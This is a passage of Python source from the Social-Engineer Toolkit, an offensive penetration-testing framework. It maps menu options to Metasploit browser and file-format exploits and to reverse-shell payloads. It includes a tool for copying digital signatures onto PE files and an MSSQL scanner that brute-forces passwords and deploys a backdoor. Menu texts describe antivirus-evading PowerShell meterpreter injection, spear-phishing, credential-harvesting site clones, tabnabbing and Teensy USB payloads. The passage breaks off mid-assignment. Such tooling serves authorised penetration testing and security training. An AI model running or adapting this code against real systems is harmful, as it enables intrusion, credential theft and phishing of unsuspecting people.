            '16':"multi/browser/java_rhino\nset target 1",
            '17':"windows/browser/ms11_050_mshtml_cobjectelement",
            '18':"windows/browser/adobe_flashplayer_flash10o",
            '19':"windows/browser/cisco_anyconnect_exec",
            '20':"windows/browser/ms11_003_ie_css_import",
            '21':"windows/browser/wmi_admintools",
            '22':"windows/browser/ms10_090_ie_css_clip",
            '23':"windows/browser/java_codebase_trust",
            '24':"windows/browser/java_docbase_bof",
            '25':"windows/browser/webdav_dll_hijacker",
            '26':"windows/browser/adobe_flashplayer_avm",
            '27':"windows/browser/adobe_shockwave_rcsl_corruption",
            '28':"windows/browser/adobe_cooltype_sing",
            '29':"windows/browser/apple_quicktime_marshaled_punk",
            '30':"windows/browser/ms10_042_helpctr_xss_cmd_exec",
            '31':"windows/browser/ms10_018_ie_behaviors",
            '32':"windows/browser/ms10_002_aurora",
            '33':"windows/browser/ms10_018_ie_tabular_activex",
            '34':"windows/browser/ms09_002_memory_corruption",
            '35':"windows/browser/ms09_072_style_object",
            '36':"windows/browser/ie_iscomponentinstalled",
            '37':"windows/browser/ms08_078_xml_corruption",
            '38':"windows/browser/ie_unsafe_scripting",
            '39':"multi/browser/firefox_escape_retval",
            '40':"windows/browser/mozilla_mchannel",
            '41':"auxiliary/server/browser_autopwn",
           }.get(exploit,"ERROR")


# called from gen_payload.py
# uses payload_menu_2
def ms_payload(payload):
    """
    Receives the input given by the user from create_payload.py
    and create_payloads.py

    """

    return {
            '1':"windows/shell_reverse_tcp",
            '2':"windows/meterpreter/reverse_tcp",
            '3':"windows/vncinject/reverse_tcp",
            '4':"windows/shell_bind_tcp",
            '5':"windows/x64/shell_bind_tcp",
            '6':"windows/x64/shell_reverse_tcp",
            '7':"windows/x64/meterpreter/reverse_tcp",
            '8':"windows/meterpreter/reverse_tcp_allports",
            '9':"windows/meterpreter/reverse_https",
            '10':"windows/meterpreter/reverse_tcp_dns",
            '11':"windows/download_exec",
            }.get(payload,"ERROR")

# called from create_payloads.py

def ms_payload_2(payload):
    """ Receives the input given by the user from create_payloadS.py """

    return {
            '1':"windows/shell_reverse_tcp",
            '2':"windows/meterpreter/reverse_tcp",
            '3':"windows/vncinject/reverse_tcp",
            '4':"windows/shell_bind_tcp",
            '5':"windows/x64/shell_bind_tcp",
            '6':"windows/x64/shell_reverse_tcp",
            '7':"windows/x64/meterpreter/reverse_tcp",
            '8':"windows/meterpreter/reverse_tcp_allports",
            '9':"windows/meterpreter/reverse_https",
            '10':"windows/meterpreter/reverse_tcp_dns",
            '11':"set/reverse_shell",
            '12':"set/reverse_shell",
            '13':"set/reverse_shell",
            '14':"shellcode/alphanum",
            '15':"shellcode/pyinject",
            '16':"shellcode/multipyinject",
            }.get(payload,"ERROR")

def ms_payload_3(payload):
    """ Receives the input given by the user from create_payloadS.py """

    return {
            '1':"windows/shell_reverse_tcp",
            '2':"windows/meterpreter/reverse_tcp",
            '3':"windows/vncinject/reverse_tcp",
            '4':"windows/x64/shell_reverse_tcp",
            '5':"windows/x64/meterpreter/reverse_tcp",
            '6':"windows/x64/shell_bind_tcp",
            '7':"windows/meterpreter/reverse_https",
            }.get(payload,"ERROR")


# uses create_payloads_menu
def ms_attacks(exploit):
    """ Receives the input given by the user from create_payload.py """

    return {
            '1':"dll_hijacking",
            '2':"unc_embed",
            '3':"exploit/windows/fileformat/ms14_017_rtf",
            '4':"exploit/windows/fileformat/ms11_006_createsizeddibsection",
            '5':"exploit/windows/fileformat/ms10_087_rtf_pfragments_bof",
            '6':"exploit/windows/fileformat/adobe_flashplayer_button",
            '7':"exploit/windows/fileformat/adobe_cooltype_sing",
            '8':"exploit/windows/fileformat/adobe_flashplayer_newfunction",
            '9':"exploit/windows/fileformat/adobe_collectemailinfo",
            '10':"exploit/windows/fileformat/adobe_geticon",
            '11':"exploit/windows/fileformat/adobe_jbig2decode",
            '12':"exploit/windows/fileformat/adobe_pdf_embedded_exe",
            '13':"exploit/windows/fileformat/adobe_utilprintf",
            '14':"custom/exe/to/vba/payload",
            '15':"exploit/windows/fileformat/adobe_u3d_meshdecl",
            '16':'exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs',
            '17':"exploit/windows/fileformat/foxit_title_bof",
            '18':"exploit/windows/fileformat/apple_quicktime_pnsize",
            '19':"exploit/windows/fileformat/nuance_pdf_launch_overflow",
            '20':"exploit/windows/fileformat/adobe_reader_u3d",
            '21':"exploit/windows/fileformat/ms12_027_mscomctl_bof",
            }.get(exploit,"INVALID")

def teensy_config(choice):
    """ Receives the input given by the user from set.py """

    return {
            '1':"powershell_down.pde",
            '2':"wscript.pde",
            '3':"powershell_reverse.pde",
            '4':"beef.pde",
            '5':"java_applet.pde",
            '6':"gnome_wget.pde"
            }.get(choice,"ERROR")

def webattack_vector(attack_vector):
    """ Receives the input given by the user from set.py """

    return {
            '1':"java",
            '2':"browser",
            '3':"harvester",
            '4':"tabnapping",
            '5':"webjacking",
            '6':"multiattack",
            '7':"fsattack"
            }.get(attack_vector,"ERROR")


def category(category):
    """
    Takes the value sent from the user encoding menu and returns
    the actual value to be used.

    """

    return {
            '0':"0",
            '1':"phishing",
            '2':"webattack",
            '3':"infectious",
            '4':"payloads",
            '5':"mailer",
            '6':"arduino",
            '7':"sms",
            '8':"wireless",
            '9':"modules",
            '10':"cloner",
            '11':"harvester",
            '12':"tabnapping",
            '13':"teensy",
            '14':"binary2teensy",
            '15':"dll_hijacking",
            '16':"multiattack",
            '17':"java_applet",
            '18':"encoding",
            '19':"fasttrack",
            '20':"autopwn",
            '21':"mssql",
            '22':"scan",
            '23':"direct",
            '24':"exploits",
            '25':"active_target",
            '26':"shell",
            '27':"set",
            '28':"teensy2powershell",
            '29':"powershell",
            '30':"delldrac",
            '31':"ridenum",
            '32':"psexec",
            '33':"fsattack",
           }.get(category,"ERROR")

########NEW FILE########
__FILENAME__ = disitool
#!/usr/bin/env python

#
# Notes from rel1k here... Had to downgrade to 0.1, the latest (0.3 currently) uses a different way for checksums of the peheader.
# This dies and fails in 64 bit operating systems, since this is the older version, shouldn't be a big deal, still works as expected.
#

"""V0.1 2007/12/18 - 2008/01/09

tool to manipulate digital signatures in PE files
commands:
- delete signed-file unsigned-file
- copy signed-source-file unsigned-file signed-file
- extract signed-file signature
- add signature unsigned-file signed-file

Source code put in public domain by Didier Stevens, no Copyright
https://DidierStevens.com
Use at your own risk

History:
 2007/12/21: added arguments
 2008/01/09: code review

requires pefile:
 http://code.google.com/p/pefile/
 to install: setup.py install
"""

import pefile
import sys
from struct import *

def Usage():
    """Displays the usage of this tool
    """
    
    print "Usage: disitool command [options] file ..."
    print "  disitool V0.1, tool to manipulate digital signatures in PE files"
    print "  commands:"
    print "  - delete signed-file unsigned-file"
    print "  - copy signed-source-file unsigned-file signed-file"
    print "  - extract signed-file signature"
    print "  - add signature unsigned-file signed-file"
    print "  Source code put in the public domain by Didier Stevens, no Copyright"
    print "  Use at your own risk"
    print "  https://DidierStevens.com"

def DeleteDigitalSignature(SignedFile, UnsignedFile=None):
    """Deletes the digital signature from file SignedFile
       When UnsignedFile is not None, writes the modified file to UnsignedFile
       Returns the modified file as a PE file
    """
    pe =  pefile.PE(SignedFile)

    address = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = 0
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = 0

    if address != 0:
        new_file_data = pe.write()[0:address]
    else:
        new_file_data = pe.write()
    
    if UnsignedFile:
        f = file(UnsignedFile, 'wb+')
        f.write(new_file_data)
        f.close()

    return new_file_data

def CopyDigitalSignature(SignedSourceFile, UnsignedFile, SignedFile=None):
    """Extracts the digital signature from file SignedSourceFile and adds it to file UnsignedFile
       When SignedFile is not None, writes the modified file to SignedFile
       Returns the modified file as a PE file
    """

    peSignedSource =  pefile.PE(SignedSourceFile)

    address = peSignedSource.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress
    size = peSignedSource.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size

    if address == 0:
        print "Error: source file not signed"
        return

    signature = peSignedSource.write()[address:]

    peUnsigned = DeleteDigitalSignature(UnsignedFile)
    
    peSignedFile = pefile.PE(data=''.join(list(peUnsigned) + list(signature)))

    peSignedFile.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = len(peUnsigned)
    peSignedFile.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = size

    new_file_data = peSignedFile.write()

    if SignedFile:
        f = file(SignedFile, 'wb+')
        f.write(new_file_data)
        f.close()

    return new_file_data

def ExtractDigitalSignature(SignedFile, SignatureFile=None):
    """Extracts the digital signature from file SignedFile
       When SignatureFile is not None, writes the signature to SignatureFile
       Returns the signature
    """

    pe =  pefile.PE(SignedFile)

    address = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress
    size = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size

    if address == 0:
        print "Error: source file not signed"
        return

    signature = pe.write()[address+8:]

    if SignatureFile:
        f = file(SignatureFile, 'wb+')
        f.write(signature)
        f.close()

    return signature

def AddDigitalSignature(SignatureFile, UnsignedFile, SignedFile=None):
    """Adds the digital signature from file SignatureFile to file UnsignedFile
       When SignedFile is not None, writes the modified file to SignedFile
       Returns the modified file as a PE file
    """

    f = file(SignatureFile, 'rb')
    signature = f.read()
    f.close()

    size = len(signature) + 8
    
    peUnsigned = DeleteDigitalSignature(UnsignedFile)
    
    peSignedFile = pefile.PE(data=''.join(list(peUnsigned) + list(unpack("4c", pack("i", size))) + ['\x00', '\x02', '\x02', '\x00'] + list(signature)))

    peSignedFile.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = len(peUnsigned)
    peSignedFile.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = size

    new_file_data = peSignedFile.write()

    if SignedFile:
        f = file(SignedFile, 'wb+')
        f.write(new_file_data)
        f.close()

    return new_file_data

########NEW FILE########
__FILENAME__ = fasttrack
#!/usr/bin/python
from src.core.setcore import *
from src.core.menu import text
import subprocess

definepath = os.getcwd()

#
#
# Fast-Track Main options and interface menus
#
#
try:
    while 1:
        ###################################################
        #        USER INPUT: SHOW WEB ATTACK MENU         #
        ###################################################

        create_menu(text.fasttrack_text, text.fasttrack_menu)
        attack_vector = raw_input(setprompt(["19"], ""))

        if attack_vector == "99" or attack_vector == "quit" or attack_vector == "exit":
            break

        ##################################
        ##################################
        # mssql_scanner
        ##################################
        ##################################
        if attack_vector == "1":
            # start the menu
            create_menu(text.fasttrack_mssql_text1, text.fasttrack_mssql_menu1)
            # take input here
            attack_vector_sql = raw_input(setprompt(["19","21"], ""))


            #
            # option 1 scan and attack, option 2 connect directly to mssql
            # if 1, start scan and attack
            #
            if attack_vector_sql == '1':
                print "\nHere you can select either a CIDR notation/IP Address or a filename\nthat contains a list of IP Addresses.\n\nFormat for a file would be similar to this:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scan IP address or CIDR\n2. Import file that contains SQL Server IP addresses\n"
                choice = raw_input(setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
                # grab ip address
                if choice == "": choice = "1"
                if choice == "1":
                    range = raw_input(setprompt(["19","21","22"], "Enter the CIDR or single IP (ex. 192.168.1.1/24)"))
                if choice == "2":
                    while 1:
                        range = raw_input(setprompt(["19","21","22"], "Enter filename for SQL servers (ex. /root/sql.txt - note can be in format of ipaddr:port)"))
                        if not os.path.isfile(range):
                            print_error("File not found! Please type in the path to the file correctly.")
                        else:
                            break            
                if choice == "1": port = "1433"                   
                if choice == "2": port = "1433"
                # ask for a wordlist
                wordlist = raw_input(setprompt(["19","21","22"], "Enter path to a wordlist file [use default wordlist]"))
                if wordlist == "": wordlist =  "default"
                # specify the user to brute force
                username = raw_input(setprompt(["19","21","22"], "Enter the username to brute force or specify username file (/root/users.txt) [sa]"))
                # default to sa
                if username == "": username = "sa"
                if username != "sa":
                    if not os.path.isfile(username):
                        print_status("If you were using a file, its not found, using text as username.")
                # import the mssql module from fasttrack
                from src.fasttrack import mssql
                # choice from earlier if we want to use a filelist or whatnot
                if choice != "2":
                    # sql_servers
                    sql_servers = ''
                    print_status("Hunting for SQL servers.. This may take a little bit.")
                    if "/" in str(range):
                        iprange = printCIDR(range)
                        iprange = iprange.split(",")
                        for host in iprange:
                            sqlport = get_sql_port(host)
                            if sqlport != None:
                                sql_servers = sql_servers + host + ":" + sqlport + ","
                    else:
                        # use udp discovery to get the SQL server IDP through 1434
                        sqlport = get_sql_port(range)
                        # UDP could be closed - defaulting to 1433
                        if sqlport != None:
                            sql_servers = range + ":" + sqlport

                # specify choice 2
                if choice == "2":
                    if not os.path.isfile(range):
                        while 1:
                            print_warning("Sorry boss. The file was not found. Try again")
                            range = raw_input(setprompt(["19","21", "22"], "Enter the CIDR, single, IP, or file with IP addresses (ex. 192.168.1.1/24)"))
                            if os.path.isfile(range):
                                print_status("Atta boy. Found the file this time. Moving on.")
                                break

                    fileopen = file(range, "r").readlines()
                    sql_servers = ""
                    for line in fileopen:
                        line=line.rstrip()
                        sql_servers = sql_servers + line + ","

                # this will hold all of the SQL servers eventually
                master_list = ""
                # set a base counter
                counter = 0
                # if we specified a username list
                if os.path.isfile(username):
                    usernames = file(username, "r")

                if sql_servers != False:
                    # get rid of extra data from port scanner
                    sql_servers = sql_servers.replace(":%s OPEN" % (port), "")
                    # split into tuple for different IP address
                    sql_servers = sql_servers.split(",")
                    # start loop and brute force
                    for servers in sql_servers:

                        # this will return the following format ipaddr + "," + username + "," + str(port) + "," + passwords
                        if servers != "":
                            # if we aren't using a username file
                            if not os.path.isfile(username):
                                sql_success = mssql.brute(servers, username, port, wordlist)
                                if sql_success != False:
                                    # after each success or fail it will break into this to the above with a newline to be parsed later
                                    master_list = master_list + sql_success + ":"
                                    counter = 1

                            # if we specified a username list
                            if os.path.isfile(username):
                                for users in usernames:
                                    users = users.rstrip()
                                    sql_success = mssql.brute(servers, users, port, wordlist)
                                    # we wont break out of the loop here incase theres multiple usernames we want to find
                                    if sql_success != False:
                                        master_list = master_list + sql_success + ":"
                                        counter = 1

                # if we didn't successful attack one
                if counter == 0:
                    print_warning("Sorry. Unable to locate or fully compromise a MSSQL Server.")
                    pause = raw_input("Press {return} to continue to the main menu.")
                # if we successfully attacked one
                if counter == 1:
                    # need to loop to keep menu going
                    while 1:
                        # set a counter to show compromised servers
                        counter = 1
                        # here we list the servers we compromised
                        master_names = master_list.split(":")
                        print_status("Select the compromise SQL server you want to interact with:\n")
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success=success.split(",")
                                success= bcolors.BOLD + success[0] + bcolors.ENDC + "   username: " + bcolors.BOLD + "%s" % (success[1]) + bcolors.ENDC + " | password: " + bcolors.BOLD + "%s" % (success[3]) + bcolors.ENDC
                                print "   " + str(counter) + ". " + success
                                # increment counter
                                counter = counter + 1

                        print "\n   99. Return back to the main menu.\n"
                        # select the server to interact with
                        select_server = raw_input(setprompt(["19","21","22"], "Select the SQL server to interact with [1]"))
                        # default 1
                        if select_server == "quit" or select_server == "exit": break
                        if select_server == "": select_server = "1"
                        if select_server == "99": break
                        counter = 1
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                # if we equal the number used above
                                if counter == int(select_server):
                                        #  ipaddr + "," + username + "," + str(port) + "," + passwords
                                    print "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) and/or powershell (vista,win7,2008,2012) or just a shell\n\n   1. Deploy Backdoor to System\n   2. Standard Windows Shell\n\n   99. Return back to the main menu.\n"
                                    option = raw_input(setprompt(["19","21","22"], "Which deployment option do you want [1]"))
                                    if option == "": option = "1"
                                    # if 99 then break
                                    if option == "99": break
                                    # specify we are using the fasttrack option, this disables some features
                                    filewrite = file(setdir + "/fasttrack.options", "w")
                                    filewrite.write("none")
                                    filewrite.close()
                                    # import fasttrack
                                    if option == "1":
                                        # import payloads for selection and prep
                                        mssql.deploy_hex2binary(success[0], success[2], success[1], success[3])
                                    # straight up connect
                                    if option == "2":
                                        mssql.cmdshell(success[0], success[2], success[1], success[3], option)
                                # increment counter
                                counter = counter + 1

            #
            # if we want to connect directly to a SQL server
            #
            if attack_vector_sql == "2":
                sql_server = raw_input(setprompt(["19","21","23"], "Enter the hostname or IP address of the SQL server"))
                sql_port = raw_input(setprompt(["19","21","23"], "Enter the SQL port to connect [1433]"))
                if sql_port == "": sql_port = "1433"
                sql_username = raw_input(setprompt(["19","21","23"], "Enter the username of the SQL Server [sa]"))
                # default to sa
                if sql_username == "": sql_username = "sa"
                sql_password = raw_input(setprompt(["19","21","23"], "Enter the password for the SQL server"))
                print_status("Connecting to the SQL server...")
                # try connecting
                # establish base counter for connection
                counter = 0
                try:
                    import _mssql
                    conn = _mssql.connect(sql_server + ":" + str(sql_port), sql_username, sql_password)
                    counter = 1
                except Exception, e:
                    print e
                    print_error("Connection to SQL Server failed. Try again.")
                # if we had a successful connection
                if counter == 1:
                    print_status("Dropping into a SQL shell. Type quit to exit.")
                    # loop forever
                    while 1:
                        # enter the sql command
                        sql_shell = raw_input("Enter your SQL command here: ")
                        if sql_shell == "quit" or sql_shell == "exit":
                            print_status("Exiting the SQL shell and returning to menu.")
                            break

                        try:
                            # execute the query
                            sql_query = conn.execute_query(sql_shell)
                            # return results
                            print "\n"
                            for data in conn:
                                data = str(data)
                                data = data.replace("\\n\\t", "\n")
                                data = data.replace("\\n", "\n")
                                data = data.replace("{0: '", "")
                                data = data.replace("'}", "")
                                print data
                        except Exception, e:
                            print_warning("\nIncorrect syntax somewhere. Printing error message: " + str(e))



        ##################################
        ##################################
        # exploits menu
        ##################################
        ##################################
        if attack_vector == "2":
            # start the menu
            create_menu(text.fasttrack_exploits_text1, text.fasttrack_exploits_menu1)
            # enter the exploits menu here
            range = raw_input(setprompt(["19","24"], "Select the number of the exploit you want"))

            # ms08067
            if range == "1":
                try: reload(src.fasttrack.exploits.ms08067)
                except: import src.fasttrack.exploits.ms08067

            # firefox 3.6.16
            if range == "2":
                try: reload(src.fasttrack.exploits.firefox_3_6_16)
                except: import src.fasttrack.exploits.firefox_3_6_16
            # solarwinds
            if range == "3":
                try: reload(src.fasttrack.exploits.solarwinds)
                except: import src.fasttrack.exploits.solarwinds

            # rdp DoS
            if range == "4":
                try: reload(src.fasttrack.exploits.rdpdos)
                except: import src.fasttrack.exploits.rdpdos

            if range == "5":
                try: reload(src.fasttrack.exploits.mysql_bypass)
                except: import src.fasttrack.exploits.mysql_bypass

            if range == "6":
                try: reload(src.fasttrack.exploits.f5)
                except: import src.fasttrack.exploits.f5

        ##################################
        ##################################
        # sccm attack menu
        ##################################
        ##################################
        if attack_vector == "3":
            # load sccm attack
            try: reload(src.fasttrack.sccm.sccm_main)
            except: import src.fasttrack.sccm.sccm_main


        ##################################
        ##################################
        # dell drac default credential checker
        ##################################
        ##################################
        if attack_vector == "4":
            # load drac menu
            subprocess.Popen("python %s/src/fasttrack/delldrac.py" % (definepath), shell=True).wait()


        ##################################
        ##################################
        # RID ENUM USER ENUMERATION
        ##################################
        ##################################
        if attack_vector == "5":
            print (""".______       __   _______         _______ .__   __.  __    __  .___  ___.
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                |______|
""")
            print "\nRID_ENUM is a tool that will enumerate user accounts through a rid cycling attack through null sessions. In\norder for this to work, the remote server will need to have null sessions enabled. In most cases, you would use\nthis against a domain controller on an internal penetration test. You do not need to provide credentials, it will\nattempt to enumerate the base RID address and then cycle through 500 (Administrator) to whatever RID you want."
            print "\n"
            ipaddr = raw_input(setprompt(["31"], "Enter the IP address of server (or quit to exit)"))
            if ipaddr == "99" or ipaddr == "quit" or ipaddr == "exit":
                break
            print_status("Next you can automatically brute force the user accounts. If you do not want to brute force, type no at the next prompt")
            dict = raw_input(setprompt(["31"], "Enter path to dictionary file to brute force [enter for built in]"))
            # if we are using the built in one
            if dict == "":
                # write out a file
                filewrite = file(setdir + "/dictionary.txt", "w")
                filewrite.write("\nPassword1")
                # specify the path
                dict = setdir + "/dictionary.txt"

            # if we are not brute forcing
            if dict.lower() == "no":
                print_status("No problem, not brute forcing user accounts")
                dict = ""

            if dict != "":
                print_warning("You are about to brute force user accounts, be careful for lockouts.")
                choice = raw_input(setprompt(["31"], "Are you sure you want to brute force [yes/no]"))
                if choice.lower() == "n" or choice.lower() == "no":
                    print_status("Okay. Not brute forcing user accounts *phew*.")
                    dict = ""

            # next we see what rid we want to start
            start_rid = raw_input(setprompt(["31"], "What RID do you want to start at [500]"))
            if start_rid == "": start_rid = "500"
            # stop rid
            stop_rid = raw_input(setprompt(["31"], "What RID do you want to stop at [15000]"))
            if stop_rid == "": stop_rid = "15000"
            print_status("Launching RID_ENUM to start enumerating user accounts...")
            subprocess.Popen("python src/fasttrack/rid_enum.py %s %s %s %s" % (ipaddr,start_rid,stop_rid,dict), shell=True).wait()

            # once we are finished, prompt.
            print_status("Everything is finished!")
            pause = raw_input("Press {return} to go back to the main menu.")

        ##################################
        ##################################
        # PSEXEC PowerShell
        ##################################
        ##################################
        if attack_vector == "6":
            print "\nPSEXEC Powershell Injection Attack:\n\nThis attack will inject a meterpreter backdoor through powershell memory injection. This will circumvent\nAnti-Virus since we will never touch disk. Will require Powershell to be installed on the remote victim\nmachine. You can use either straight passwords or hash values.\n"
            try: reload(src.fasttrack.psexec)
            except: import src.fasttrack.psexec

# handle keyboard exceptions
except KeyboardInterrupt:
    pass

########NEW FILE########
__FILENAME__ = text
#!/usr/bin/env python
########################################################################
#
# text menu for set menu stuff
#
########################################################################
from src.core.setcore import bcolors, get_version, check_os, meta_path

# grab version of SET
define_version = get_version()

# check operating system
operating_system = check_os()

# grab metasploit path
msf_path = meta_path()

PORT_NOT_ZERO = "Port cannot be zero!"
PORT_TOO_HIGH = "Let's stick with the LOWER 65,535 ports..."

main_text = " Select from the menu:\n"

main_menu = ['Social-Engineering Attacks',
             'Fast-Track Penetration Testing',
             'Third Party Modules',
             'Update the Metasploit Framework',
             'Update the Social-Engineer Toolkit',
             'Update SET configuration',
             'Help, Credits, and About']

main = ['Spear-Phishing Attack Vectors',
        'Website Attack Vectors',
        'Infectious Media Generator',
        'Create a Payload and Listener',
        'Mass Mailer Attack',
        'Arduino-Based Attack Vector',
        'SMS Spoofing Attack Vector',
        'Wireless Access Point Attack Vector',
        'QRCode Generator Attack Vector',
        'Powershell Attack Vectors',
        'Third Party Modules']

spearphish_menu = ['Perform a Mass Email Attack',
                   'Create a FileFormat Payload',
                   'Create a Social-Engineering Template',
                   '0D']

spearphish_text = ("""
 The """ + bcolors.BOLD + """Spearphishing""" + bcolors.ENDC + """ module allows you to specially craft email messages and send
 them to a large (or small) number of people with attached fileformat malicious
 payloads. If you want to spoof your email address, be sure "Sendmail" is in-
 stalled (apt-get install sendmail) and change the config/set_config SENDMAIL=OFF
 flag to SENDMAIL=ON.

 There are two options, one is getting your feet wet and letting SET do
 everything for you (option 1), the second is to create your own FileFormat
 payload and use it in your own attack. Either way, good luck and enjoy!
""")

webattack_menu = ['Java Applet Attack Method',
                  'Metasploit Browser Exploit Method',
                  'Credential Harvester Attack Method',
                  'Tabnabbing Attack Method',
                  'Web Jacking Attack Method',
                  'Multi-Attack Web Method',
                  'Full Screen Attack Method',
                  '0D']

fasttrack_menu = ['Microsoft SQL Bruter',
                 'Custom Exploits',
                 'SCCM Attack Vector',
                 'Dell DRAC/Chassis Default Checker',
                 'RID_ENUM - User Enumeration Attack',
                 'PSEXEC Powershell Injection',
                 '0D']

fasttrack_text = ("""
Welcome to the Social-Engineer Toolkit - """ + bcolors.BOLD + """Fast-Track Penetration Testing platform""" + bcolors.ENDC + """. These attack vectors
have a series of exploits and automation aspects to assist in the art of penetration testing. SET
now incorporates the attack vectors leveraged in Fast-Track. All of these attack vectors have been
completely rewritten and customized from scratch as to improve functionality and capabilities.
""")

fasttrack_exploits_menu1 = ['MS08-067 (Win2000, Win2k3, WinXP)',
                           'Mozilla Firefox 3.6.16 mChannel Object Use After Free Exploit (Win7)',
                           'Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit',
                           'RDP | Use after Free - Denial of Service',
                           'MySQL Authentication Bypass Exploit',
                           'F5 Root Authentication Bypass Exploit',
                           '0D']

fasttrack_exploits_text1 = ("""
Welcome to the Social-Engineer Toolkit - Fast-Track Penetration Testing """ + bcolors.BOLD + """Exploits Section""" + bcolors.ENDC + """. This
menu has obscure exploits and ones that are primarily python driven. This will continue to grow over time.
""")

fasttrack_mssql_menu1 = ['Scan and Attack MSSQL',
                        'Connect directly to MSSQL',
                        '0D']

fasttrack_mssql_text1 = ("""
Welcome to the Social-Engineer Toolkit - Fast-Track Penetration Testing """ + bcolors.BOLD + """Microsoft SQL Brute Forcer""" + bcolors.ENDC + """. This
attack vector will attempt to identify live MSSQL servers and brute force the weak account passwords that
may be found. If that occurs, SET will then compromise the affected system by deploying a binary to
hexadecimal attack vector which will take a raw binary, convert it to hexadecimal and use a staged approach
in deploying the hexadecimal form of the binary onto the underlying system. At this point, a trigger will occur
to convert the payload back to a binary for us.
""")

webattack_text = ("""
The Web Attack module is  a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.

The """ + bcolors.BOLD + """Java Applet Attack""" + bcolors.ENDC + """ method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.

The """ + bcolors.BOLD + """Metasploit Browser Exploit""" + bcolors.ENDC + """ method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.

The """ + bcolors.BOLD + """Credential Harvester""" + bcolors.ENDC + """ method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.

The """ + bcolors.BOLD + """TabNabbing""" + bcolors.ENDC + """ method will wait for a user to move to a different tab, then refresh the page to something different.

The """ + bcolors.BOLD + """Web-Jacking Attack""" + bcolors.ENDC + """ method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.

The """ + bcolors.BOLD + """Multi-Attack""" + bcolors.ENDC + """ method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.
""")

webattack_vectors_menu = ['Web Templates',
                          'Site Cloner',
                          'Custom Import\n',
                          ]

webattack_vectors_text = ("""
 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.
   """)

teensy_menu = ['Powershell HTTP GET MSF Payload',
               'WSCRIPT HTTP GET MSF Payload',
               'Powershell based Reverse Shell Payload',
               'Internet Explorer/FireFox Beef Jack Payload',
               'Go to malicious java site and accept applet Payload',
               'Gnome wget Download Payload',
               'Binary 2 Teensy Attack (Deploy MSF payloads)',
               'SDCard 2 Teensy Attack (Deploy Any EXE)',
               'SDCard 2 Teensy Attack (Deploy on OSX)',
               'X10 Arduino Sniffer PDE and Libraries',
               'X10 Arduino Jammer PDE and Libraries',
               'Powershell Direct ShellCode Teensy Attack',
               'Peensy Multi Attack Dip Switch + SDCard Attack',
               '0D']

teensy_text = ("""
 The """ + bcolors.BOLD + """Arduino-Based Attack""" + bcolors.ENDC + """ Vector utilizes the Arduin-based device to
 program the device. You can leverage the Teensy's, which have onboard
 storage and can allow for remote code execution on the physical
 system. Since the devices are registered as USB Keyboard's it
 will bypass any autorun disabled or endpoint protection on the
 system.

 You will need to purchase the Teensy USB device, it's roughly
 $22 dollars. This attack vector will auto generate the code
 needed in order to deploy the payload on the system for you.

 This attack vector will create the .pde files necessary to import
 into Arduino (the IDE used for programming the Teensy). The attack
 vectors range from Powershell based downloaders, wscript attacks,
 and other methods.

 For more information on specifications and good tutorials visit:

 http://www.irongeek.com/i.php?page=security/programmable-hid-usb-keystroke-dongle

 To purchase a Teensy, visit: http://www.pjrc.com/store/teensy.html
 Special thanks to: IronGeek, WinFang, and Garland

 This attack vector also attacks X10 based controllers, be sure to be leveraging
 X10 based communication devices in order for this to work.

 Select a payload to create the pde file to import into Arduino:
""")

sms_attack_menu = ['Perform a SMS Spoofing Attack',
                   'Create a Social-Engineering Template',
                   '0D']

sms_attack_text = ("""
